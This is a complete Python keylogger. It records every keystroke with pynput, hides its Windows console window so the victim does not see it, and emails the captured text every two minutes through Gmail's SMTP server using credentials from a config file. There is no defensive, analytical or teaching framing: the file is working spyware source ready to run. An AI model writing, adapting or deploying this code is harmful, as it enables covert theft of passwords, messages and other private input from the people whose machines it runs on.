import pynput.keyboard
import threading
import smtplib
import json
import ctypes
import sys
import os

# Robustly load credentials
def load_credentials(config_path='config.json'):
    try:
        if not os.path.exists(config_path):
            raise FileNotFoundError(f"{config_path} not found.")
        with open(config_path, 'r') as file:
            config = json.load(file)
            return config.get('email'), config.get('password')
    except Exception as e:
        print(f"Error loading credentials: {e}")
        return None, None

email = None
password = None
content = ""
caps_lock_on = False  # Flag to track Caps Lock state
email_interval = 120  # Email interval in seconds

# Mapping of numpad virtual key codes to their corresponding numbers
numpad_map = {
    96: "0", 97: "1", 98: "2", 99: "3", 100: "4", 101: "5", 
    102: "6", 103: "7", 104: "8", 105: "9", 110: ".",
}

def send_mail(email, password, message):
    try:
        if not email or not password:
            raise ValueError("Credentials not set.")
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

def notify_start():
    try:
        message = "Keylogger Started"
        send_mail(email, password, message)
    except Exception as e:
        print(f"Failed to notify start: {e}")

def process_key_strike(key):
    global content, caps_lock_on
    try:
        # Handle Numpad keys
        if hasattr(key, 'vk') and key.vk in numpad_map:
            content += numpad_map[key.vk]
            return

        # Handle character keys
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            # Convert to uppercase if Caps Lock is on
            if caps_lock_on:
                char = char.upper() if char.isalpha() else char
            content += char
        else:
            # Handle special keys
            if key == pynput.keyboard.Key.space:
                content += " "
            elif key == pynput.keyboard.Key.caps_lock:
                caps_lock_on = not caps_lock_on
            elif key == pynput.keyboard.Key.enter:
                content += "\n"
            elif key == pynput.keyboard.Key.tab:
                content += "\t"
            else:
                content += f" [{key}] "
    except Exception as e:
        print(f"Error processing key strike: {e}")

def report():
    global content
    try:
        while True:
            if content:  
                send_mail(email, password, content)
                content = ""
            threading.Event().wait(email_interval)
    except Exception as e:
        print(f"Error in report thread: {e}")

def hide_console():
    """Hide the console window."""
    try:
        if sys.platform == "win32":
            ctypes.windll.kernel32.SetConsoleTitleW("")
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception as e:
        print(f"Failed to hide console: {e}")

def main():
    try:
        global email, password
        
        # Load credentials
        email, password = load_credentials()
        if not email or not password:
            print("Missing email or password. Exiting.")
            sys.exit(1)
        
        # Hide the console window
        hide_console()
        
        # Notify that the keylogger has started
        notify_start()

        # Start the report thread
        email_thread = threading.Thread(target=report)
        email_thread.daemon = True
        email_thread.start()

        # Set up the keylogger
        with pynput.keyboard.Listener(on_press=process_key_strike) as my_listener:
            my_listener.join()
    except Exception as e:
        print(f"Critical error in main: {e}")

if __name__ == "__main__":
    main()
